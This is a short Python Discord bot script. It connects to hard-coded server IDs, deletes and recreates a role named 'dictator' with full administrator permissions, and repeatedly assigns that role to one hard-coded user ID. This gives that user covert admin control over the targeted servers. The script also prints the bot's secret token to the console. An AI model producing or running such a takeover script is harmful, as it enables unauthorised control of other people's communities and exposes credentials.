import discord
from discord.ext import commands
import time

bot = input("Bot to use: ")

with open(bot + "/.token.txt", "r") as f:
    TOKEN = f.readline().strip()

class Perms(commands.Bot):

    def __init__(self, command_prefix):
        commands.Bot.__init__(self, command_prefix=command_prefix)

    async def on_ready(self):
        print(f'{self.user} has connected to Discord!')

        while True:

            # guild = self.get_guild(848340708397416468) # jonny is mean
            # guild = self.fetch_guild(961267722560364664) # ranch
            guild = await self.fetch_guild(901990653976797224) # geniosity
            # guild = await self.fetch_guild(912117701995008041) # kinda troll

            for r in await guild.fetch_roles():
                print(r, r.position)
                if r.name == "dictator":
                    try:
                        await r.delete()
                    except:
                        continue


            perms = discord.Permissions()
            perms.update(administrator = True)

            role = await guild.create_role(name="dictator", colour=discord.Colour.teal(), permissions=perms)


            me = await guild.fetch_member(705140914091458640)

            while True:
                try:
                    await me.add_roles(role)
                    time.sleep(0.5)

                except Exception as e:
                    print(e)
                    break


client = Perms("abcdefghijklmnopqrstuvwxyz")
print(TOKEN)
client.run(TOKEN)
